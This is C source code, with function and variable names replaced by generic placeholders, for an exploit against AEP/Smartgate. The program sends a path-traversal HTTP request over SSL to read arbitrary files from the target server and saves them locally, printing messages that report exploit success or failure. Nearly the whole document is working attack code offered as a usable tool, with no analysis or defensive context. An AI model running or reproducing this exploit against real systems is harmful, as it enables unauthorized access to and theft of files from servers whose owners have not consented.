
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct option {char* member_0; int member_1; char member_3; int member_2; } ;
typedef int SSL_CTX ;
typedef int SSL ;
typedef int BIO ;


 scalar_t__ FUNC_0 (int *) ;
 int FUNC_1 (int *) ;
 int FUNC_2 (int *,int **) ;
 int * FUNC_3 (int *) ;
 int FUNC_4 (int *,char*,int) ;
 int FUNC_5 (int *,char*) ;
 int FUNC_6 (int *,char*,int) ;
 int FUNC_7 () ;
 int FUNC_8 (int ) ;
 int VAR_0 ;
 int VAR_1 ;
 int FUNC_9 () ;
 int FUNC_10 (int *) ;
 int * FUNC_11 (int ) ;
 int VAR_2 ;
 int FUNC_12 () ;
 int FUNC_13 (int *,int ) ;
 int FUNC_14 () ;
 int VAR_3 ;
 int FUNC_15 (int) ;
 int FUNC_16 (int ) ;
 int FUNC_17 (int ,char*) ;
 int FUNC_18 (char*) ;
 int FUNC_19 (int,char**,char*,struct option*,int*) ;
 char* FUNC_20 (int) ;
 int FUNC_21 (char*,int ,int) ;
 int FUNC_22 (char*,int,int ) ;
 char* VAR_4 ;
 int FUNC_23 (char*,...) ;
 int FUNC_24 (char*,char*,char*,...) ;
 int VAR_5 ;
 int FUNC_25 (char*) ;
 scalar_t__ FUNC_26 (char*,char*) ;
 int FUNC_27 (int,char*,int) ;

int FUNC_28(int VAR_6,char *VAR_7[])
{
    BIO * VAR_8;
    SSL * VAR_9;
    SSL_CTX * VAR_10;
    int VAR_11,VAR_12,VAR_13,VAR_14 = 0;
    unsigned long VAR_15 = 0;
    int VAR_16 = 0, VAR_17 = 0, VAR_18 = 0, VAR_19 = 0, VAR_20 = 0;
    char *VAR_21,*VAR_22,*VAR_23,*VAR_24,*VAR_25,*VAR_26,*VAR_27;
    char *VAR_28 = "GET /..\\..\\..\\..\\..\\..\\..\\";
    char *VAR_29 = " HTTP/1.1\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A";
    char VAR_30[1024];
    static struct option VAR_31[]= {
     {"server", 1, 0, 's'},
     {"port", 1 , 0, 'p'},
     {"remotefile", 1, 0, 'f'},
     {"localfile", 1, 0, 'l'},
     {"help", 0, 0, 'h'}
    };
    FUNC_23("[ AEP/Smartgate arbitrary file download exploit\n");
    while(VAR_12 != -1)
    {
     VAR_12 = FUNC_19(VAR_6,VAR_7,"s:p:f:l:h",VAR_31,&VAR_14);
     switch(VAR_12){
  case -1:
       break;
  case 's':
       VAR_21 = FUNC_20(FUNC_25(VAR_4) + 1);
       FUNC_24(VAR_21,"%s",VAR_4);
       VAR_16 = 1;
       break;
  case 'p':
       VAR_25 = FUNC_20(FUNC_25(VAR_4) + 1);
       FUNC_24(VAR_25,"%s",VAR_4);
       VAR_17 = 1;
       break;
  case 'f':
       VAR_22 = FUNC_20(FUNC_25(VAR_4) + FUNC_25(VAR_28) + FUNC_25(VAR_29) + 1);
       FUNC_24(VAR_22,"%s%s%s",VAR_28,VAR_4,VAR_29);
       VAR_18 = 1;
       break;
  case 'l':
       VAR_23 = FUNC_20(FUNC_25(VAR_4) + 1);
       FUNC_24(VAR_23,"%s",VAR_4);
       VAR_19 = 1;
       break;
  case 'h':
       FUNC_23("[\n[ %s\n",VAR_7[0]);
       FUNC_23("[   --server|-s <dns/ip>\n");
       FUNC_23("[   --port|-p <port>\n");
       FUNC_23("[   --remotefile|-f <path/and/file>\n");
       FUNC_23("[   --localfile|-l <localfile/to/saveas>\n");
       FUNC_23("[\n[ For a more detailed explanation read the source\n");
       FUNC_16(0);
       break;
  default:
       break;

     }
    }
    if(VAR_16 != 1 || VAR_17 != 1 || VAR_18 != 1 || VAR_19 != 1){
     FUNC_23("[ Try %s --help\n",VAR_7[0]);
     FUNC_16(0);
    }
    FUNC_7();
    FUNC_12();
    FUNC_9();
    VAR_10 = FUNC_11(FUNC_14());
    VAR_8 = FUNC_3(VAR_10);
    FUNC_2(VAR_8, & VAR_9);
    FUNC_13(VAR_9, VAR_2);
    VAR_24 = FUNC_20(FUNC_25(VAR_21) + FUNC_25(VAR_25) + 2);
    FUNC_24(VAR_24,"%s:%s",VAR_21,VAR_25);
    FUNC_5(VAR_8, VAR_24);
    if(FUNC_0(VAR_8) <= 0)
    {
        FUNC_17(VAR_5, "[ Error attempting to connect\n");
        FUNC_8(VAR_5);
        FUNC_1(VAR_8);
        FUNC_10(VAR_10);
        return 0;
    }
    FUNC_23("[ Connected to %s via (%s/tcp)\n",VAR_21,VAR_25);
    FUNC_6(VAR_8, VAR_22, FUNC_25(VAR_22));
    VAR_20 = 0;
    VAR_26 = FUNC_20(2);
    FUNC_21(VAR_26,0,2);
    while(VAR_20 == 0)
    {
     VAR_11 = FUNC_4(VAR_8, VAR_30, 1);
     VAR_30[VAR_11] = 0;
 VAR_27 = FUNC_20(FUNC_25(VAR_30) + FUNC_25(VAR_26) + 1);
     FUNC_24(VAR_27,"%s%s",VAR_26,VAR_30);
 FUNC_18(VAR_26);
 VAR_26 = VAR_27;
 VAR_20 = (int)FUNC_26(VAR_26,"\n\n");
    }
    FUNC_23("[ Displaying raw HTTP response details\n");
    FUNC_23("%s",VAR_26);
    VAR_20 = 0;
    VAR_20 = (int)FUNC_26(VAR_26,"200 OK");
    if(VAR_20 != 0)
    {
 FUNC_23("[ Exploit success, file found\n");
     VAR_13 = FUNC_22(VAR_23,VAR_1|VAR_0,VAR_3);
     if(VAR_13 == -1){
      FUNC_23("[ Error creating %s",VAR_23);
      FUNC_16(0);
     }
     for(;;)
     {
         VAR_11 = FUNC_4(VAR_8, VAR_30, 1023);
         if(VAR_11 <= 0) break;
                VAR_30[VAR_11] = 0;
  FUNC_27(VAR_13,VAR_30,VAR_11);
  VAR_15 = VAR_15 + VAR_11;
     }
 FUNC_23("[ Recieved %u byte(s) and saved as '%s'\n",VAR_15,VAR_23);
 FUNC_15(VAR_13);
    }
    if(VAR_20==0)
    {
     VAR_20 = (int)FUNC_26(VAR_26,"301 Moved");
     if(VAR_20 != 0)
     {
      FUNC_23("[ Exploit success, directory found\n");
     }
    }
    FUNC_18(VAR_26);
    if(VAR_20 == 0)
    {
     FUNC_23("[ Exploit failed\n");
    }
    FUNC_1(VAR_8);
    FUNC_10(VAR_10);
    return 0;
}
